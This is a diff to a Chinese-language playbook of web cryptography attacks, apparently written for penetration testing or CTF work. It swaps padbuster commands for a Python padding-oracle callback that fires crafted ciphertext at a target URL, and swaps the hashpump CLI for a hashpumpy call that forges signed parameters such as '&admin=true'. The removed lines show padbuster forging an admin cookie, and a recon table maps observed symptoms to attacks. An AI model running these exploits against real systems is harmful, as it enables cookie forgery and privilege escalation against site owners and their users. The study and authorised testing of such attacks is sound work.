@@ -7,7 +7,7 @@
 
 | 看到什么 | 攻击方向 | 工具 |
 |---|---|---|
-| 加密 Cookie/参数 + 解密失败响应有差异 | Padding Oracle | padbuster（§2） |
+| 加密 Cookie/参数 + 解密失败响应有差异 | Padding Oracle | python 内联 oracle（§2） |
 | 密文含 role=user 等可辨识明文结构（CBC） | CBC bit-flip | Python XOR 脚本（§3） |
 | 密码重置 + 短 Token 基于时间戳 | 弱随机数爆破 | 时间戳枚举脚本（§4） |
 | 参数带 sign=md5hash 类签名（secret 前置拼接） | 哈希长度扩展 | hashpump（§5） |
@@ -29,33 +29,36 @@
 
 典型场景: ASP.NET Padding Oracle（CVE-2010-3332）、自定义加密 Cookie（role=user → 改 role=admin）。
 
-### 2.2 PadBuster 用法
+### 2.2 利用实现（python 内联）
 
-```bash
-# 解密（URL 参数密文）
-padbuster http://target/api ENCRYPTED_TOKEN 16 -encoding 0
+攻击核心函数在 `crypto-analysis/knowledge-base/symmetric-and-hash.md` §4（padding_oracle_block + CBC-R 伪造任意明文，完整可执行）。HTTP 场景只需封装 oracle 回调:
 
-# Cookie 场景解密
-padbuster http://target/ COOKIE_VALUE 16 -cookies "session=COOKIE_VALUE" -encoding 0
+```python
+import requests, base64, binascii
+from sys import path as _p  # oracle 核心函数按 symmetric-and-hash §4 抄入或 import
 
-# 伪造任意明文（如伪造 admin Cookie）
-padbuster http://target/ COOKIE_VALUE 16 -cookies "session=COOKIE_VALUE" \
-    -encoding 0 -plaintext '{"user":"admin","role":"admin"}'
+def make_oracle(url, cipher_param="token", is_valid=lambda r: r.status_code == 200,
+                encode=lambda b: base64.b64encode(b).decode(), method="get", extra=None):
+    """按目标参数名/编码/错误特征封装 padding oracle 回调"""
+    def oracle(prev_block, cipher_block):
+        payload = encode(bytes(prev_block) + bytes(cipher_block))
+        if method == "get":
+            r = requests.get(url, params={cipher_param: payload}, timeout=8)
+        else:
+            r = requests.post(url, data={cipher_param: payload}, timeout=8)
+        return is_valid(r)
+    return oracle
 
-# POST 场景
-padbuster http://target/decrypt ENCRYPTED 16 -post "data=ENCRYPTED" -encoding 0
-
-# 非标准错误响应时指定错误特征串
-padbuster http://target/ TOKEN 16 -error "Invalid padding" -encoding 0
+# 错误特征未知时: 先发随机密文 256 次统计响应签名（状态码+长度），频次最高者 = padding 错误签名
+# （is_valid 改为 lambda r: (r.status_code, len(r.content)) != ERROR_SIGNATURE）
 ```
 
-参数（官方 padBuster.pl v0.3.3 源码核验）:
-- `-encoding [0-4]` 默认 0: **0=Base64, 1=小写 HEX, 2=大写 HEX, 3=.NET UrlToken, 4=WebSafe Base64**（部分教程流传的"0=hex"是错的）
-- BlockSize: AES=16, DES=8；样本字节数必须被 BlockSize 整除，否则报错（编码/块大小选错的第一信号）
-- 样本只有一个块 → 需 `-noiv`（解密模式默认首块为 IV）
-- 不传 `-error` → 自动响应分析：先发 256 个请求列出响应签名频次表，选频次最高者为错误签名
-- `-noencode` 关闭默认 payload URL 编码；`-usebody` 用响应体做分析；`-resume N` 断点续跑；`-interactive` 逐字节确认（网络噪声时）
-- 依赖 Perl + LWP（Kali: `apt install padbuster`）；不可用见 symmetric-and-hash.md §4 手写版
+场景要点（对应 perl 工具的参数语义）:
+- **编码判别**: Base64 样本（含 =/+/）/ 小写 hex / 大写 hex / .NET UrlToken（末尾填充位数标识）/ WebSafe Base64（-_）——按样本字符集直接判
+- **块大小**: AES=16, DES=8; 样本解码后字节数不被块大小整除 = 编码或块大小选错的第一信号
+- **单块样本**: 解密模式默认首块为 IV——解出的是 IV⊕明文关系，单块样本需无 IV 模式（直接攻击唯一密文块）
+- **Cookie 场景**: oracle 回调从 params 换 cookies={"session": payload}; **POST 场景**: method="post" + data
+- **网络噪声**: 末字节 0x01 命中后翻倒数第二字节复验（§4 假阳性校验）; 断点续跑按块记录 inter 数组持久化
 
 ## 3. CBC Bit-Flip 篡改加密 Cookie
 
@@ -110,10 +113,12 @@ php_mt_seed OUTPUT_VALUE   # 从单个输出恢复种子 → 预测该进程后�
 关联场景: 随机文件名/验证码/Token 由 mt_rand() 生成且输出可观测（回显验证码、文件名带随机数）→ 预测下一个值。
 random_int()/random_bytes()（CSPRNG）不可预测，不适用。
 
-## 5. 哈希长度扩展（hashpump CLI）
+## 5. 哈希长度扩展（hashpumpy，随 $PYTHON_CMD 环境提供）
 
-```bash
-hashpump -s ORIGINAL_HASH -d 'original_data' -a '&admin=true' -k SECRET_LENGTH
+```python
+from hashpumpy import hashpump
+# new_hash/new_data 可直接用于伪造签名重放
+new_hash, new_data = hashpump(original_hash, b'original_data', b'&admin=true', SECRET_LENGTH)
 ```
 
 SECRET_LENGTH 未知 → 暴力枚举（通常 8-32）:
